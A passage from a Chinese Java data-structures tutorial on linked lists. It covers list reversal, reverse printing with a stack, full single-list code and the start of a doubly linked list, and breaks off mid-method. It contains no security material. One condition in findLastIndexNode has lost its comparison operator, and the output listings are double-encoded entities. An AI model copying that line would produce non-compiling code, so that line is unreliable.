    singleLinkedList.add(hero3);
    singleLinkedList.add(hero4);

    System.out.println(&quot;原来链表的情况~~&quot;);
    singleLinkedList.list();

    System.out.println(&quot;反转单链表~~&quot;);
    reversetList(singleLinkedList.getHead());
    singleLinkedList.list();
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;程序运行结果&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;&amp;amp;#x539F;&amp;amp;#x6765;&amp;amp;#x94FE;&amp;amp;#x8868;&amp;amp;#x7684;&amp;amp;#x60C5;&amp;amp;#x51B5;~~
HeroNode [no=1, name=&amp;amp;#x5B8B;&amp;amp;#x6C5F;, nickName=&amp;amp;#x53CA;&amp;amp;#x65F6;&amp;amp;#x96E8;]
HeroNode [no=2, name=&amp;amp;#x5362;&amp;amp;#x4FCA;&amp;amp;#x4E49;, nickName=&amp;amp;#x7389;&amp;amp;#x9E92;&amp;amp;#x9E9F;]
HeroNode [no=3, name=&amp;amp;#x5434;&amp;amp;#x7528;, nickName=&amp;amp;#x667A;&amp;amp;#x591A;&amp;amp;#x661F;]
HeroNode [no=4, name=&amp;amp;#x6797;&amp;amp;#x51B2;, nickName=&amp;amp;#x8C79;&amp;amp;#x5B50;&amp;amp;#x5934;]
&amp;amp;#x53CD;&amp;amp;#x8F6C;&amp;amp;#x5355;&amp;amp;#x94FE;&amp;amp;#x8868;~~
HeroNode [no=4, name=&amp;amp;#x6797;&amp;amp;#x51B2;, nickName=&amp;amp;#x8C79;&amp;amp;#x5B50;&amp;amp;#x5934;]
HeroNode [no=3, name=&amp;amp;#x5434;&amp;amp;#x7528;, nickName=&amp;amp;#x667A;&amp;amp;#x591A;&amp;amp;#x661F;]
HeroNode [no=2, name=&amp;amp;#x5362;&amp;amp;#x4FCA;&amp;amp;#x4E49;, nickName=&amp;amp;#x7389;&amp;amp;#x9E92;&amp;amp;#x9E9F;]
HeroNode [no=1, name=&amp;amp;#x5B8B;&amp;amp;#x6C5F;, nickName=&amp;amp;#x53CA;&amp;amp;#x65F6;&amp;amp;#x96E8;]
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;34、单链表的反转（我的代码）&quot;&gt;3.4、单链表的反转（我的代码）&lt;/h3&gt;
&lt;h4 id=&quot;341、代码思路&quot;&gt;3.4.1、代码思路&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;单链表的反转【腾讯面试题，有点难度】
&lt;ul&gt;&lt;li&gt;原链表为 cur 指向 next ，反转链表不就是把 next 指向 cur 吗？&lt;/li&gt;
&lt;li&gt;由于 next 指向 cur 时，next 将 &lt;strong&gt;丢失&lt;/strong&gt;其下一节点的地址，所以需要先将 nnext 保存起来&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;next ==null&lt;/strong&gt; 时链表已经反转完毕，最后将头结点指向 cur 节点即可&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cDovL2hleWdvLm9zcy1jbi1zaGFuZ2hhaS5hbGl5dW5jcy5jb20vaW1hZ2VzL2ltYWdlLTIwMjAwNzEzMjIwNjI3NjAwLnBuZw?x-oss-process=image/format,png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;342、代码实现&quot;&gt;3.4.2、代码实现&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;单链表的反转&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;
public static void myReversetList(HeroNode head) {

    if (head.next == null || head.next.next == null) {
        return;
    }

    HeroNode cur = head.next;

    HeroNode next = cur.next;

    cur.next = null;

    while (next != null) {

        HeroNode nnext = next.next;

        next.next = cur;

        cur = next;
        next = nnext;
    }

    head.next = cur;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;测试代码&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public static void main(String[] args) {

    HeroNode hero1 = new HeroNode(1, &quot;宋江&quot;, &quot;及时雨&quot;);
    HeroNode hero2 = new HeroNode(2, &quot;卢俊义&quot;, &quot;玉麒麟&quot;);
    HeroNode hero3 = new HeroNode(3, &quot;吴用&quot;, &quot;智多星&quot;);
    HeroNode hero4 = new HeroNode(4, &quot;林冲&quot;, &quot;豹子头&quot;);

    SingleLinkedList singleLinkedList = new SingleLinkedList();

    singleLinkedList.add(hero1);
    singleLinkedList.add(hero2);
    singleLinkedList.add(hero3);
    singleLinkedList.add(hero4);

    System.out.println(&quot;原来链表的情况~~&quot;);
    singleLinkedList.list();

    System.out.println(&quot;反转单链表~~&quot;);
    reversetList(singleLinkedList.getHead());
    singleLinkedList.list();
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;程序运行结果&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;&amp;amp;#x539F;&amp;amp;#x6765;&amp;amp;#x94FE;&amp;amp;#x8868;&amp;amp;#x7684;&amp;amp;#x60C5;&amp;amp;#x51B5;~~
HeroNode [no=1, name=&amp;amp;#x5B8B;&amp;amp;#x6C5F;, nickName=&amp;amp;#x53CA;&amp;amp;#x65F6;&amp;amp;#x96E8;]
HeroNode [no=2, name=&amp;amp;#x5362;&amp;amp;#x4FCA;&amp;amp;#x4E49;, nickName=&amp;amp;#x7389;&amp;amp;#x9E92;&amp;amp;#x9E9F;]
HeroNode [no=3, name=&amp;amp;#x5434;&amp;amp;#x7528;, nickName=&amp;amp;#x667A;&amp;amp;#x591A;&amp;amp;#x661F;]
HeroNode [no=4, name=&amp;amp;#x6797;&amp;amp;#x51B2;, nickName=&amp;amp;#x8C79;&amp;amp;#x5B50;&amp;amp;#x5934;]
&amp;amp;#x53CD;&amp;amp;#x8F6C;&amp;amp;#x5355;&amp;amp;#x94FE;&amp;amp;#x8868;~~
HeroNode [no=4, name=&amp;amp;#x6797;&amp;amp;#x51B2;, nickName=&amp;amp;#x8C79;&amp;amp;#x5B50;&amp;amp;#x5934;]
HeroNode [no=3, name=&amp;amp;#x5434;&amp;amp;#x7528;, nickName=&amp;amp;#x667A;&amp;amp;#x591A;&amp;amp;#x661F;]
HeroNode [no=2, name=&amp;amp;#x5362;&amp;amp;#x4FCA;&amp;amp;#x4E49;, nickName=&amp;amp;#x7389;&amp;amp;#x9E92;&amp;amp;#x9E9F;]
HeroNode [no=1, name=&amp;amp;#x5B8B;&amp;amp;#x6C5F;, nickName=&amp;amp;#x53CA;&amp;amp;#x65F6;&amp;amp;#x96E8;]
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;35、从尾到头打印单链表&quot;&gt;3.5、从尾到头打印单链表&lt;/h3&gt;
&lt;h4 id=&quot;351、栈的基本使用&quot;&gt;3.5.1、栈的基本使用&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;测试代码&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public static void main(String[] args) {
    Stack&amp;lt;String&amp;gt; stack = new Stack();

    stack.add(&quot;jack&quot;);
    stack.add(&quot;tom&quot;);
    stack.add(&quot;smith&quot;);

    while (stack.size() &amp;gt; 0) {
        System.out.println(stack.pop());
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;程序运行结果&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;smith
tom
jack
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;352、代码思路&quot;&gt;3.5.2、代码思路&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;从尾到头打印单链表 【百度，要求方式1：反向遍历 。 方式2：Stack栈】
&lt;ul&gt;&lt;li&gt;方式一：先将单链表进行反转操作，然后再遍历输出，问题： &lt;strong&gt;破坏原链表结构&lt;/strong&gt;，不可取&lt;/li&gt;
&lt;li&gt;方式二：遍历链表，去除节点压入栈中，利用栈 &lt;strong&gt;先进后出&lt;/strong&gt;的特点，实现逆序打印&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cDovL2hleWdvLm9zcy1jbi1zaGFuZ2hhaS5hbGl5dW5jcy5jb20vaW1hZ2VzL2ltYWdlLTIwMjAwNzI2MTExODA4NTYzLnBuZw?x-oss-process=image/format,png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;353、代码实现&quot;&gt;3.5.3、代码实现&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;从尾到头打印单链表&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;
public static void reversePrint(HeroNode head) {
    if (head.next == null) {
        return;
    }

    Stack&amp;lt;HeroNode&amp;gt; stack = new Stack&amp;lt;HeroNode&amp;gt;();
    HeroNode cur = head.next;

    while (cur != null) {
        stack.push(cur);
        cur = cur.next;
    }

    while (stack.size() &amp;gt; 0) {
        System.out.println(stack.pop());
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;测试代码&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public static void main(String[] args) {

    HeroNode hero1 = new HeroNode(1, &quot;宋江&quot;, &quot;及时雨&quot;);
    HeroNode hero2 = new HeroNode(2, &quot;卢俊义&quot;, &quot;玉麒麟&quot;);
    HeroNode hero3 = new HeroNode(3, &quot;吴用&quot;, &quot;智多星&quot;);
    HeroNode hero4 = new HeroNode(4, &quot;林冲&quot;, &quot;豹子头&quot;);

    SingleLinkedList singleLinkedList = new SingleLinkedList();

    singleLinkedList.add(hero1);
    singleLinkedList.add(hero2);
    singleLinkedList.add(hero3);
    singleLinkedList.add(hero4);

    System.out.println(&quot;原来链表的情况~~&quot;);
    singleLinkedList.list();

    System.out.println(&quot;测试逆序打印单链表, 没有改变链表的结构~~&quot;);
    reversePrint(singleLinkedList.getHead());
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;程序运行结果&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;&amp;amp;#x539F;&amp;amp;#x6765;&amp;amp;#x94FE;&amp;amp;#x8868;&amp;amp;#x7684;&amp;amp;#x60C5;&amp;amp;#x51B5;~~
HeroNode [no=1, name=&amp;amp;#x5B8B;&amp;amp;#x6C5F;, nickName=&amp;amp;#x53CA;&amp;amp;#x65F6;&amp;amp;#x96E8;]
HeroNode [no=2, name=&amp;amp;#x5362;&amp;amp;#x4FCA;&amp;amp;#x4E49;, nickName=&amp;amp;#x7389;&amp;amp;#x9E92;&amp;amp;#x9E9F;]
HeroNode [no=3, name=&amp;amp;#x5434;&amp;amp;#x7528;, nickName=&amp;amp;#x667A;&amp;amp;#x591A;&amp;amp;#x661F;]
HeroNode [no=4, name=&amp;amp;#x6797;&amp;amp;#x51B2;, nickName=&amp;amp;#x8C79;&amp;amp;#x5B50;&amp;amp;#x5934;]
&amp;amp;#x6D4B;&amp;amp;#x8BD5;&amp;amp;#x9006;&amp;amp;#x5E8F;&amp;amp;#x6253;&amp;amp;#x5370;&amp;amp;#x5355;&amp;amp;#x94FE;&amp;amp;#x8868;, &amp;amp;#x6CA1;&amp;amp;#x6709;&amp;amp;#x6539;&amp;amp;#x53D8;&amp;amp;#x94FE;&amp;amp;#x8868;&amp;amp;#x7684;&amp;amp;#x7ED3;&amp;amp;#x6784;~~
HeroNode [no=4, name=&amp;amp;#x6797;&amp;amp;#x51B2;, nickName=&amp;amp;#x8C79;&amp;amp;#x5B50;&amp;amp;#x5934;]
HeroNode [no=3, name=&amp;amp;#x5434;&amp;amp;#x7528;, nickName=&amp;amp;#x667A;&amp;amp;#x591A;&amp;amp;#x661F;]
HeroNode [no=2, name=&amp;amp;#x5362;&amp;amp;#x4FCA;&amp;amp;#x4E49;, nickName=&amp;amp;#x7389;&amp;amp;#x9E92;&amp;amp;#x9E9F;]
HeroNode [no=1, name=&amp;amp;#x5B8B;&amp;amp;#x6C5F;, nickName=&amp;amp;#x53CA;&amp;amp;#x65F6;&amp;amp;#x96E8;]
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;36、合并两个有序的单链表&quot;&gt;3.6、合并两个有序的单链表&lt;/h3&gt;
&lt;h4 id=&quot;361、代码思路&quot;&gt;3.6.1、代码思路&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;合并两个有序的单链表，合并之后的链表依然有序【课后练习】&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;362、代码实现&quot;&gt;3.6.2、代码实现&lt;/h4&gt;
&lt;h3 id=&quot;37、单向链表所有代码&quot;&gt;3.7、单向链表所有代码&lt;/h3&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class SingleLinkedListDemo {

        public static void main(String[] args) {

                HeroNode hero1 = new HeroNode(1, &quot;宋江&quot;, &quot;及时雨&quot;);
                HeroNode hero2 = new HeroNode(2, &quot;卢俊义&quot;, &quot;玉麒麟&quot;);
                HeroNode hero3 = new HeroNode(3, &quot;吴用&quot;, &quot;智多星&quot;);
                HeroNode hero4 = new HeroNode(4, &quot;林冲&quot;, &quot;豹子头&quot;);

                SingleLinkedList singleLinkedList = new SingleLinkedList();

                singleLinkedList.add(hero1);
                singleLinkedList.add(hero4);
                singleLinkedList.add(hero2);
                singleLinkedList.add(hero3);

                System.out.println(&quot;原来链表的情况~~&quot;);
                singleLinkedList.list();

                System.out.println(&quot;反转单链表~~&quot;);
                reversetList(singleLinkedList.getHead());
                singleLinkedList.list();

                System.out.println(&quot;测试逆序打印单链表, 没有改变链表的结构~~&quot;);
                reversePrint(singleLinkedList.getHead());

                singleLinkedList.addByOrder(hero1);
                singleLinkedList.addByOrder(hero4);
                singleLinkedList.addByOrder(hero2);
                singleLinkedList.addByOrder(hero3);

                singleLinkedList.list();

                HeroNode newHeroNode = new HeroNode(2, &quot;小卢&quot;, &quot;玉麒麟~~&quot;);
                singleLinkedList.update(newHeroNode);

                System.out.println(&quot;修改后的链表情况~~&quot;);
                singleLinkedList.list();

                singleLinkedList.del(1);
                singleLinkedList.del(4);
                System.out.println(&quot;删除后的链表情况~~&quot;);
                singleLinkedList.list();

                System.out.println(&quot;有效的节点个数=&quot; + getLength(singleLinkedList.getHead()));

                HeroNode res = findLastIndexNode(singleLinkedList.getHead(), 3);
                System.out.println(&quot;res=&quot; + res);

        }

        public static void reversePrint(HeroNode head) {
                if (head.next == null) {
                        return;
                }

                Stack&amp;lt;HeroNode&amp;gt; stack = new Stack&amp;lt;HeroNode&amp;gt;();
                HeroNode cur = head.next;

                while (cur != null) {
                        stack.push(cur);
                        cur = cur.next;
                }

                while (stack.size() &amp;gt; 0) {
                        System.out.println(stack.pop());
                }
        }

        public static void reversetList(HeroNode head) {

                if (head.next == null || head.next.next == null) {
                        return;
                }

                HeroNode cur = head.next;
                HeroNode next = null;
                HeroNode reverseHead = new HeroNode(0, &quot;&quot;, &quot;&quot;);

                while (cur != null) {
                        next = cur.next;
                        cur.next = reverseHead.next;
                        reverseHead.next = cur;
                        cur = next;
                }

                head.next = reverseHead.next;
        }

        public static void myReversetList(HeroNode head) {

                if (head.next == null || head.next.next == null) {
                        return;
                }

                HeroNode cur = head.next;

                HeroNode next = cur.next;

                cur.next = null;

                while (next != null) {

                        HeroNode nnext = next.next;

                        next.next = cur;

                        cur = next;
                        next = nnext;
                }

                head.next = cur;
        }

        public static HeroNode findLastIndexNode(HeroNode head, int index) {

                if (head.next == null) {
                        return null;
                }

                int size = getLength(head);

                if (index  0 || index &amp;gt; size) {
                        return null;
                }

                HeroNode cur = head.next;
                for (int i = 0; i &amp;lt; size - index; i++) {
                        cur = cur.next;
                }
                return cur;

        }

        public static int getLength(HeroNode head) {
                if (head.next == null) {
                        return 0;
                }
                int length = 0;

                HeroNode cur = head.next;
                while (cur != null) {
                        length++;
                        cur = cur.next;
                }
                return length;
        }

}

class SingleLinkedList {

        private HeroNode head = new HeroNode(0, &quot;&quot;, &quot;&quot;);

        public HeroNode getHead() {
                return head;
        }

        public void add(HeroNode heroNode) {

                HeroNode temp = head;

                while (true) {

                        if (temp.next == null) {
                                break;
                        }

                        temp = temp.next;
                }

                temp.next = heroNode;
        }

        public void addByOrder(HeroNode heroNode) {

                HeroNode temp = head;
                boolean flag = false;
                while (true) {
                        if (temp.next == null) {
                                break;
                        }
                        if (temp.next.no &amp;gt; heroNode.no) {
                                break;
                        } else if (temp.next.no == heroNode.no) {

                                flag = true;
                                break;
                        }
                        temp = temp.next;
                }

                if (flag) {
                        System.out.printf(&quot;准备插入的英雄的编号 %d 已经存在了, 不能加入\n&quot;, heroNode.no);
                } else {

                        heroNode.next = temp.next;
                        temp.next = heroNode;
                }
        }

        public void update(HeroNode newHeroNode) {

                if (head.next == null) {
                        System.out.println(&quot;链表为空~&quot;);
                        return;
                }

                HeroNode temp = head.next;
                boolean flag = false;
                while (true) {
                        if (temp == null) {
                                break;
                        }
                        if (temp.no == newHeroNode.no) {

                                flag = true;
                                break;
                        }
                        temp = temp.next;
                }

                if (flag) {
                        temp.name = newHeroNode.name;
                        temp.nickName = newHeroNode.nickName;
                } else {
                        System.out.printf(&quot;没有找到 编号 %d 的节点，不能修改\n&quot;, newHeroNode.no);
                }
        }

        public void del(int no) {
                HeroNode temp = head;
                boolean flag = false;
                while (true) {
                        if (temp.next == null) {
                                break;
                        }
                        if (temp.next.no == no) {

                                flag = true;
                                break;
                        }
                        temp = temp.next;
                }

                if (flag) {

                        temp.next = temp.next.next;
                } else {
                        System.out.printf(&quot;要删除的 %d 节点不存在\n&quot;, no);
                }
        }

        public void list() {

                if (head.next == null) {
                        System.out.println(&quot;链表为空&quot;);
                        return;
                }

                HeroNode temp = head.next;
                while (true) {

                        if (temp == null) {
                                break;
                        }

                        System.out.println(temp);

                        temp = temp.next;
                }
        }
}

class HeroNode {
        public int no;
        public String name;
        public String nickName;
        public HeroNode next;

        public HeroNode(int no, String name, String nickname) {
                this.no = no;
                this.name = name;
                this.nickName = nickname;
        }

        @Override
        public String toString() {
                return &quot;HeroNode [no=&quot; + no + &quot;, name=&quot; + name + &quot;, nickName=&quot; + nickName + &quot;]&quot;;
        }

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;4、双向链表&quot;&gt;4、双向链表&lt;/h2&gt;
&lt;h3 id=&quot;41、与单向链表的比较&quot;&gt;4.1、与单向链表的比较&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;单向链表， 查找的方向只能是一个方向， 而双向链表可以向前或者向后查找&lt;/li&gt;
&lt;li&gt;单向链表不能自我删除， 需要靠辅助节点 ， 而双向链表， 则可以 &lt;strong&gt;自我删除&lt;/strong&gt;， 所以前面我们单链表删除时节点， 总是找到 temp ，temp 是待删除节点的 &lt;strong&gt;前一个节点&lt;/strong&gt;(认真体会)&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cDovL2hleWdvLm9zcy1jbi1zaGFuZ2hhaS5hbGl5dW5jcy5jb20vaW1hZ2VzL2ltYWdlLTIwMjAwNzI2MTExNzQ4OTg3LnBuZw?x-oss-process=image/format,png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;42、链表节点定义&quot;&gt;4.2、链表节点定义&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;在单向链表节点的基础上，增加 pre ，用于指向前一个节点&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;
class HeroNode {
        public int no;
        public String name;
        public String nickname;
        public HeroNode next;
        public HeroNode pre;

        public HeroNode(int no, String name, String nickname) {
                this.no = no;
                this.name = name;
                this.nickname = nickname;
        }

        @Override
        public String toString() {
                return &quot;HeroNode [no=&quot; + no + &quot;, name=&quot; + name + &quot;, nickname=&quot; + nickname + &quot;]&quot;;
        }

}

&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;43、链表定义&quot;&gt;4.3、链表定义&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;定义整个链表的头结点，作为链表的入口&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;
class DoubleLinkedList {

        private HeroNode head = new HeroNode(0, &quot;&quot;, &quot;&quot;);

        public HeroNode getHead() {
                return head;
        }

&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;44、链表遍历&quot;&gt;4.4、链表遍历&lt;/h3&gt;
&lt;h4 id=&quot;441、代码思路&quot;&gt;4.4.1、代码思路&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;定义辅助变量 temp ，相当于一个指针，指向 &lt;strong&gt;当前节点&lt;/strong&gt; ，用于遍历链表&lt;/li&gt;
&lt;li&gt;何时停止 while 循环？ &lt;strong&gt;temp == null&lt;/strong&gt; ：已经遍历至链表尾部&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;442、代码实现&quot;&gt;4.4.2、代码实现&lt;/h4&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;
public void list() {

    if (head.next == null) {
        System.out.println(&quot;链表为空&quot;);
        return;
    }

    HeroNode temp = head.next;
    while (true) {

        if (temp == null) {
            break;
        }

        System.out.println(temp);

        temp = temp.next;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;45、尾部插入&quot;&gt;4.5、尾部插入&lt;/h3&gt;
&lt;h4 id=&quot;451、代码思路&quot;&gt;4.5.1、代码思路&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;定义辅助变量 temp ，相当于一个指针，指向 &lt;strong&gt;当前节点&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;何时停止 while 循环？ &lt;strong&gt;temp.next == null&lt;/strong&gt; ：temp 节点已经是链表最后一个节点，在 temp 节点之后插入 heroNode 节点即可&lt;/li&gt;
&lt;li&gt;如何插入？
&lt;ul&gt;&lt;li&gt;temp.next 指向新的尾节点 heroNode ： &lt;strong&gt;temp.next = heroNode;&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;heroNode .pre 指向旧的尾节点 temp ： *&lt;em&gt;heroNode.pre = temp;&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;452、代码实现&quot;&gt;4.5.2、代码实现&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;在链表尾部插入节点&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;
public void add(HeroNode heroNode) {

    HeroNode temp = head;

    while (true) {

        if (temp.next == null) {
            break;
        }

        temp = temp.next;
    }

    temp.next = heroNode;
    heroNode.pre = temp;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;46、按顺序插入&quot;&gt;4.6、按顺序插入&lt;/h3&gt;
&lt;h4 id=&quot;461、代码思路&quot;&gt;4.6.1、代码思路&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;定义辅助变量 temp ，相当于一个指针，指向 &lt;strong&gt;当前节点&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;我们将 heroNode 节点插入到 temp 节点之后还是 temp 节点之前？
&lt;ul&gt;&lt;li&gt;如果插入到 temp 节点之后：
&lt;ul&gt;&lt;li&gt;判断条件： &lt;strong&gt;temp.next.no &amp;gt; heroNode.no&lt;/strong&gt; ，即 temp 的下一个节点的值比 heroNode 节点的值大，所以需要将 heroNode 插入到 temp 节点之后&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;while 循环终止条件：
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;temp.next == null&lt;/strong&gt; ：temp 节点已经是链表的尾节点&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;temp.next.no &amp;gt; heroNode.no&lt;/strong&gt; ：heroNode 节点的值介于 temp 节点的值和 temp 下一个节点的值之间&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;temp.next.no == heroNode.no&lt;/strong&gt; ：heroNode 节点的值等于 temp 下一个节点的值，不能进行插入 &lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cDovL2hleWdvLm9zcy1jbi1zaGFuZ2hhaS5hbGl5dW5jcy5jb20vaW1hZ2VzL2ltYWdlLTIwMjAwNzI2MTEyODMzMTEwLnBuZw?x-oss-process=image/format,png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;如果插入到 temp 节点之前：
&lt;ul&gt;&lt;li&gt;判断条件： &lt;strong&gt;temp.no &amp;gt; heroNode.no&lt;/strong&gt; ，即 temp 节点的值比 heroNode 节点的值大，所以需要将 heroNode 插入到 temp 节点之前&lt;/li&gt;
&lt;li&gt;存在的问题：如果需要在链表尾部插入 heroNode 节点，即需要在 null 节点之前插入 heroNode 节点， &lt;strong&gt;定位至 null 节点将丢失其前一个节点的信息&lt;/strong&gt;（除非使用一个变量保存起来），所以跳出循环的判断条件为：temp.next == null&lt;/li&gt;
&lt;li&gt;所以我们选取：【插入到 temp 节点之后】方案&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;462、代码实现&quot;&gt;4.6.2、代码实现&lt;/h4&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;
public void addByOrder(HeroNode heroNode) {

    HeroNode temp = head;
    boolean flag = false;
    while (true) {
        if (temp.next == null) {
            break;
        }
        if (temp.next.no &amp;gt; heroNode.no) {
            break;
        } else if (temp.next.no == heroNode.no) {
            flag = true;
            break;
        }
        temp = temp.next;
    }

    if (flag) {
        System.out.printf(&quot;准备插入的英雄的编号 %d 已经存在了, 不能加入\n&quot;, heroNode.no);
    } else {

        heroNode.next = temp.next;
        if(temp.next != null) {
            temp.next.pre = heroNode;
        }

        temp.next = heroNode;
        heroNode.pre = temp;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;47、修改节点信息&quot;&gt;4.7、修改节点信息&lt;/h3&gt;
&lt;h4 id=&quot;471、代码思路&quot;&gt;4.7.1、代码思路&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;定义辅助变量 temp ，相当于一个指针，指向 &lt;strong&gt;当前节点&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;如何找到指定节点？ *&lt;em&gt;temp.no == no&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;472、代码实现&quot;&gt;4.7.2、代码实现&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;修改指定节点的信息&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;
public void update(HeroNode newHeroNode) {

    if (head.next == null) {
        System.out.println(&quot;链表为空~&quot;);
        return;
    }

    HeroNode temp = head.next;
    boolean flag = false;
    while (true) {
        if (temp == null) {
            break;
        }
        if (temp.no == newHeroNode.no) {

            flag = true;
            break;
        }
        temp = temp.next;
    }

    if (flag) {
        temp.name = newHeroNode.name;
        temp.nickname = newHeroNode.nickname;
    } else {
        System.out.printf(&quot;没有找到 编号 %d 的节点，不能修改\n&quot;, newHeroNode.no);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;48、删除节点&quot;&gt;4.8、删除节点&lt;/h3&gt;
&lt;h4 id=&quot;481、代码思路&quot;&gt;4.8.1、代码思路&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;定义辅助变量 temp ，相当于一个指针，指向 &lt;strong&gt;当前节点&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;while 循环的终止条件？由于 temp 节点就是待删除节点，所以终止条件是： &lt;strong&gt;temp == null&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;为何双向链表，可以实现 &lt;strong&gt;自我删除&lt;/strong&gt;？定位至待删除的节点 temp ，由于temp 节点有其前一个节点和后一个节点的信息，所以可实现自我删除&lt;/li&gt;
&lt;li&gt;如何删除？
&lt;ul&gt;&lt;li&gt;temp 的前一个节点的 next 域指向 temp 的后一个节点： &lt;strong&gt;temp.pre.next = temp.next;&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;temp 的后一个节点的 pre 域指向 temp 的前一个节点： &lt;strong&gt;temp.next.pre = temp.pre;&lt;/strong&gt;
&lt;ul&gt;&lt;li&gt;有个地方需要注意，如果 temp 已经是链表尾节点，temp 已经没有下一个节点&lt;/li&gt;
&lt;li&gt;这时只需要将 temp 的前一个节点的 next 指向 null 即可&lt;/li&gt;
&lt;li&gt;所以 &lt;strong&gt;temp.next.pre = temp.pre;&lt;/strong&gt; 执行的前提条件是 *&lt;em&gt;temp.next != null&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;482、代码实现&quot;&gt;4.8.2、代码实现&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;删除指定节点&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;
public void del(int no) {

    if (head.next == null) {
        System.out.println(&quot;链表为空，无法删除&quot;);
        return;
    }

    HeroNode temp = head.next;
